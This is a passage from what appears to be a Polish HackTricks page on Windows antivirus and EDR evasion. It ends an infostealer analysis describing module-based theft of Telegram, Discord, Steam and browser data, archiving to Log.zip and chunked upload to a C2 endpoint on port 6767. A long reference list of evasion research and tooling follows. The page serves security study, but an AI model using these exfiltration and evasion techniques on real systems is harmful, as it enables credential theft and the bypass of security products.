- `create_memory_based_log` przechodzi przez globalną tablicę wskaźników funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarki itp.). Każdy wątek zapisuje wyniki do współdzielonych buforów i po około 45-sekundowym oczekiwaniu na zakończenie zgłasza liczbę plików.
- Po zakończeniu wszystkie dane są pakowane za pomocą statycznie dołączonej biblioteki `miniz` do `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` usypia na 15 s i przesyła archiwum w porcjach po 10 MB przez HTTP POST na `http://<C2>:6767/upload`, podszywając się pod granicę `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Każda porcja zawiera `User-Agent: upload`, `auth: <build_id>`, opcjonalne `w: <campaign_tag>`, a ostatnia porcja dodaje `complete: true`, aby C2 wiedział, że scalanie zostało zakończone.

## References

- [1] [Zaawansowane techniki unikania wykrycia: precyzyjny module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stosy wywołań: koniec z taryfą ulgową dla malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacja](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – przykład](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – przykład](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – spoofing stosu wywołań PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nowy łańcuch infekcji i zaciemnianie oparte na ConfuserEx w przypadku DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Czy można ufać modelowi zero trust? Omijanie kontroli stanu urządzenia Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: nadużywanie eksportów przekazywanych dalej](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Wykaz eksportów przekazywanych dalej w Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Kolejność wyszukiwania bibliotek DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Zabezpieczenia procesów i prawa dostępu](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Dokumentacja EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Program uruchamiający CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Ochrona przed EDR przy użyciu Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Przełamanie ochrony Windows Defender za pomocą techniki przekierowania folderu](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Dokumentacja polecenia mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Za czystą kurtyną: od RAT-a przez builder do programisty](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer nadchodzi: nowy, ambitny infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – odszyfrowywanie Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: śledzenie wywołań API w celu pokonania malware Node.js](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Śpiąca Królewna: usypianie Adaptix za pomocą Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Zatruwanie parametrów procesu](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Śpiąca Królewna II: CFG, CET i spoofing stosu](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuskacja uśpienia Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ukrywanie Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Nadużywanie Chrome Remote Desktop w operacjach Red Team: praktyczny przewodnik](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: wykorzystanie sterownika naprawczego Defendera jako prymitywu operacji w jądrze](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Kod towarzyszący Function Peekaboo od MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: tworzenie samomaskujących się funkcji za pomocą LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - kod źródłowy InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funkcja CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Tworzenie procesu potomnego z przekierowanym wejściem i wyjściem](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - Nekromancja GhostPack: odtwarzanie narzędzi C# za pomocą WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - kompilowanie projektów C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof of concept i kod źródłowy DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — nadużywanie wewnętrznych mechanizmów puli wątków do wstrzykiwania DLL bez shellcode'u](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Zbiór danych testowych EMBER2024 i narzędzia thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Wykorzystanie EMBER2024 do oceny implantów Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Unikanie wykrywania opartego na uczeniu maszynowym](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – framework ładowania .NET oparty na XAML: NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Wyliczenie AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Metoda IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
